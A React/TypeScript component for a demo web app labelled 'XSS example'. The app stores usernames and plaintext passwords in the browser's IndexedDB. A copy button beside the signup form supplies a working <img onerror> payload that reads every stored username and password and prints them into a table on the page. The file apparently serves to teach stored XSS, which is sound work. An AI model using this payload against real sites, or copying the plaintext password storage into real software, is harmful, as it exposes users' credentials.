import { useEffect, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { useForm } from "react-hook-form";
import { openDB, DBSchema } from "idb";
import copy from "clipboard-copy";
import { Transition } from "@headlessui/react";

import "twin.macro";

import { Snackbar, useSnackbar, Tooltip } from ".";
import { LinkArrow } from "./svgs";

interface MyDB extends DBSchema {
  users: {
    key: number;
    value: {
      username: string;
      password: string;
    };
    indexes: {
      username: string;
      password: string;
    };
  };
}

const dbName = "users_database";

const listHeading = (
  <h2 tw="ml-5 uppercase font-semibold tracking-wide text-white">
    List of users
  </h2>
);

async function createDatabase() {
  const db = await openDB<MyDB>(dbName, 2, {
    upgrade(db) {
      // Create a store of objects
      const store = db.createObjectStore("users", {
        // The 'id' property of the object will be the key.
        keyPath: "id",
        // If it isn't explicitly set, create a value by auto incrementing.
        autoIncrement: true,
      });
      // Create an index on the 'date' property of the objects.
      store.createIndex("username", "username", { unique: true });
      store.createIndex("password", "password");
    },
  });

  return db;
}

interface State {
  username: string;
  password: string;
}

const initialState = {
  username: "",
  password: "",
};

const Home = () => {
  const [users, setUsers] = useState<State[]>([]);

  useEffect(() => {
    const doStuff = async () => {
      const db = await createDatabase();
      const promise = await db.getAll("users");
      const length = await promise.length;
      if (length === 0) {
        await db.add("users", {
          username: "davidMurdoch",
          password: "hunter2",
        });
        await db.add("users", {
          username: "newUser",
          password: "test",
        });
      }

      // const tx = db.transaction("users");

      // for await (const cursor of db.transaction("users").store) {
      //   console.log(cursor.index);
      //   cursor.continue();
      // }

      setUsers(await db.getAll("users"));
    };
    doStuff();
    // return () => {
    //   const clearIdb = async () => {
    //     const db = await createDatabase();
    //     await db.clear();
    //   };
    //   clearIdb();
    // };
  }, []);

  const { register, handleSubmit, reset } = useForm({
    defaultValues: initialState,
  });

  const onSubmit = async (data: State) => {
    const db = await createDatabase();
    await db.add("users", data);
    setUsers((prevState) => [...prevState, data]);
    reset(initialState, {
      dirtyFields: false, // dirtyFields will not be reset
      isDirty: false, // dirty will not be reset
      isSubmitted: false,
      touched: false,
      isValid: false,
      submitCount: false,
    });
  };

  const { handleOpen } = useSnackbar();

  const suggestionRef = useRef<HTMLElement>(null);

  const [isOpen, setOpen] = useState<boolean>(false);

  return (
    <>
      <div tw="min-h-screen flex overflow-hidden bg-gray-100">
        <Transition show={isOpen}>
          <div tw="md:hidden h-full">
            <div tw="fixed inset-0 flex z-40">
              <Transition.Child
                enter="transition-opacity ease-linear duration-300"
                enterFrom="opacity-0"
                enterTo="opacity-100"
                leave="transition-opacity ease-linear duration-300"
                leaveFrom="opacity-100"
                leaveTo="opacity-0"
              >
                <div tw="fixed inset-0" aria-hidden="true">
                  <div
                    tw="absolute inset-0 bg-gray-600 opacity-75"
                    onClick={() => setOpen(false)}
                  />
                </div>
              </Transition.Child>
              <Transition.Child
                enter="transition ease-in-out duration-300 transform"
                enterFrom="-translate-x-full"
                enterTo="translate-x-0"
                leave="transition ease-in-out duration-300 transform"
                leaveFrom="translate-x-0"
                leaveTo="-translate-x-full"
              >
                <div tw="relative flex-1 flex flex-col max-w-xs w-full bg-indigo-700 h-full">
                  <div tw="absolute top-0 right-0 -mr-12 pt-2">
                    <button
                      tw="ml-1 flex items-center justify-center h-10 w-10 rounded-full focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white"
                      onClick={() => setOpen(false)}
                    >
                      <span tw="sr-only">Close sidebar</span>

                      <svg
                        tw="h-6 w-6 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                        aria-hidden="true"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M6 18L18 6M6 6l12 12"
                        />
                      </svg>
                    </button>
                  </div>
                  <div tw="flex-1 h-0 pt-5 pb-4 overflow-y-auto">
                    <div tw="flex-shrink-0 flex items-center px-4">
                      <img
                        tw="h-8 w-auto"
                        src="https://tailwindui.com/img/logos/workflow-logo-indigo-300-mark-white-text.svg"
                        alt="Workflow"
                      />
                    </div>
                    <nav tw="mt-5 px-2 space-y-1">
                      {listHeading}
                      {users.map(({ username }, index) => (
                        <Link
                          to={`/${username}`}
                          key={`${username}-${index}-list`}
                          tw="text-white hover:bg-indigo-600 hover:bg-opacity-75 flex items-center px-2 py-2 text-base font-medium rounded-md"
                        >
                          <LinkArrow tw="mr-4 h-6 w-6 text-indigo-300" />
                          {username}
                        </Link>
                      ))}
                    </nav>
                  </div>
                </div>
                <div tw="flex-shrink-0 w-14" aria-hidden="true" />
              </Transition.Child>
            </div>
          </div>
        </Transition>

        <div tw="hidden bg-indigo-700 md:flex md:flex-shrink-0">
          <div tw="flex flex-col w-64">
            <div tw="flex flex-col h-0 flex-1">
              <div tw="flex-1 flex flex-col pt-5 pb-4 overflow-y-auto">
                <nav tw="mt-5 flex-1 px-2 space-y-1">
                  {listHeading}
                  {users.map(({ username }, index) => (
                    <Link
                      to={`/${username}`}
                      key={`${username}-${index}-list`}
                      tw="text-white hover:bg-indigo-600 hover:bg-opacity-75 flex items-center px-2 py-2 text-sm font-medium rounded-md"
                    >
                      <LinkArrow tw="mr-4 h-6 w-6 text-indigo-300" />
                      {username}
                    </Link>
                  ))}
                </nav>
              </div>
            </div>
          </div>
        </div>
        <div tw="flex flex-col w-0 flex-1 overflow-hidden">
          <div tw="md:hidden pl-1 pt-1 sm:pl-3 sm:pt-3">
            <button
              tw="-ml-0.5 -mt-0.5 h-12 w-12 inline-flex items-center justify-center rounded-md text-gray-500 hover:text-gray-900 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-indigo-500"
              onClick={() => setOpen(true)}
            >
              <span tw="sr-only">Open sidebar</span>

              <svg
                tw="h-6 w-6"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                aria-hidden="true"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M4 6h16M4 12h16M4 18h16"
                />
              </svg>
            </button>
          </div>

          <main tw="w-full bg-gray-100 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
            <div tw="sm:mx-auto sm:w-full sm:max-w-md">
              <h2 tw="text-base text-center text-indigo-600 font-semibold tracking-wide uppercase">
                XSS example
              </h2>

              <h2 tw="mt-6 text-center text-3xl font-extrabold text-gray-900">
                Create new account
              </h2>
            </div>

            <div tw="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
              <div tw="bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
                <form tw="space-y-6" onSubmit={handleSubmit(onSubmit)}>
                  <div>
                    <label
                      htmlFor="email"
                      tw="block text-sm font-medium text-gray-700"
                    >
                      Username
                    </label>
                    <div tw="mt-1">
                      <textarea
                        id="username"
                        name="username"
                        ref={register({
                          required: true,
                        })}
                        tw="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                      />
                    </div>
                    <div tw="flex">
                      <Tooltip>
                        <button
                          tw="rounded-full hover:bg-gray-200 p-4"
                          type="button"
                          onClick={() => {
                            if (suggestionRef.current) {
                              copy(suggestionRef.current.innerText);
                            }
                            handleOpen();
                          }}
                        >
                          <svg width="24" height="24">
                            <rect
                              width="24"
                              height="24"
                              fill="none"
                              rx="0"
                              ry="0"
                            />
                            <path
                              fillRule="evenodd"
                              clipRule="evenodd"
                              d="M9 2C7.89543 2 7 2.89543 7 4V5H6C4.89543 5 4 5.89543 4 7V20C4 21.1046 4.89543 22 6 22H15C16.1046 22 17 21.1046 17 20V19H18C19.1046 19 20 18.1046 20 17V4C20 2.89543 19.1046 2 18 2H9ZM17 7V17.8H17.8C18.3523 17.8 18.8 17.3523 18.8 16.8V4.2C18.8 3.64772 18.3523 3.2 17.8 3.2H9.2C8.64772 3.2 8.2 3.64771 8.2 4.2V5H15C16.1046 5 17 5.89543 17 7ZM6.2 6.2C5.64772 6.2 5.2 6.64771 5.2 7.2V19.8C5.2 20.3523 5.64771 20.8 6.2 20.8H14.8C15.3523 20.8 15.8 20.3523 15.8 19.8V7.2C15.8 6.64772 15.3523 6.2 14.8 6.2H6.2Z"
                              fill="gray"
                            />
                          </svg>
                        </button>
                      </Tooltip>
                      <small
                        tw="ml-3 text-gray-700"
                        ref={suggestionRef}
                      >{`<img onerror='
                  (() => {
                    const request = indexedDB.open("users_database", 2);
                    request.onsuccess = function (event) {
                      const db = event.target.result;
                      const transaction = db.transaction(["users"], "readwrite");
                      const objectStore = transaction.objectStore("users");
                      const contents = objectStore.getAll();
                      contents.onsuccess = (event) => {
                        const data = event.target.result;

                        console.log(data, "data");

                        const main = document.querySelector(".main");

                        const tr = document.createElement("tr");

                        const th1 = document.createElement("th");
                        const th2 = document.createElement("th");

                        th1.classList.add("px-4", "py-2");
                        th2.classList.add("px-4", "py-2");

                        th1.textContent="Username";
                        th2.textContent="Password";

                        const thead = document.createElement("thead");
                        const tbody = document.createElement("tbody");

                        const table = document.createElement("table");
                        const container = document.createElement("div");

                        thead.classList.add("bg-gray-50");

                        table.classList.add("divide-y", "divide-gray-200");

                        container.classList.add("shadow", "overflow-hidden", "border-b", "border-gray-200", "sm:rounded-lg");

                        tr.append(th1);
                        tr.append(th2);

                        thead.append(tr);
                        
                        table.append(thead);

                        for (const { username, password } of data) {
                          const tr = document.createElement("tr");
                          const td1 = document.createElement("td");
                          const td2 = document.createElement("td");

                          td1.classList.add("border", "px-4", "py-2");
                          td2.classList.add("border", "px-4", "py-2");

                          td1.textContent = username;
                          td2.textContent = password;

                          tr.append(td1);
                          tr.append(td2);

                          tbody.append(tr);
                        }

                        table.append(tbody);

                        container.append(table);

                        main.append(container);
                  
                      };
                    };
                  })();
                ' src='invalid-image'>`}</small>
                    </div>
                  </div>

                  <div>
                    <label
                      htmlFor="password"
                      tw="block text-sm font-medium text-gray-700"
                    >
                      Password
                    </label>
                    <div tw="mt-1">
                      <input
                        id="password"
                        name="password"
                        type="password"
                        autoComplete="current-password"
                        tw="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                        ref={register({
                          required: true,
                        })}
                      />
                    </div>
                  </div>

                  <div>
                    <button
                      type="submit"
                      tw="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                    >
                      Continue
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </main>
        </div>
      </div>
      <Snackbar>Copied!</Snackbar>
    </>
  );
};

export { Home };
